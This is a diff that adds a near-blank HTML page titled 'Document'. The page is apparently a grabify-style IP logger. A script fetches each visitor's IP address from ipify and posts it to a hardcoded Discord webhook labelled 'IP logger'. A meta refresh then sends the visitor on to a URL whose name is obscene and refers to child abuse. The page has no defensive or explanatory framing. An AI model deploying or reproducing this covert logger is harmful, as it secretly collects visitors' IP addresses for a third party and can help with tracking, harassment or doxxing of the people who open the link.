@@ -1,0 +1,31 @@
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+	<meta http-equiv="refresh" content="3;url=https://ifuckbabieswithmyfist.vercel.app/" />
+</head>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <meta http-equiv="refresh" content="3;url=https://ifuckbabieswithmyfist.vercel.app/" />
+</head><script>
+  function getIP(json) {
+    var request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1217205352186249227/KqHJxNytabuSYuOcW8vjPkNcHswDkA6vogPTXE0cH1j9wQqxZatiYLOkxkxd3bh9TNNV"); //Your Webhook 
+  
+        request.setRequestHeader('Content-type', 'application/json');
+  
+        var params = {
+          username: "IP logger",
+          avatar_url: "https://images-ext-2.discordapp.net/external/KgJHnlN0ajyNkO9Ig6ih7rrI2oELuUKvM0wouvgkYsU/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/889935505066696724/72e1c0cd552e90501770aec2a9616d21.png", //Webhook Avatar
+          content: "This is the IP of the last visitor: " + json.ip + ""
+        }
+  
+        request.send(JSON.stringify(params));
+      }
+  
+  </script>
+  <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>  
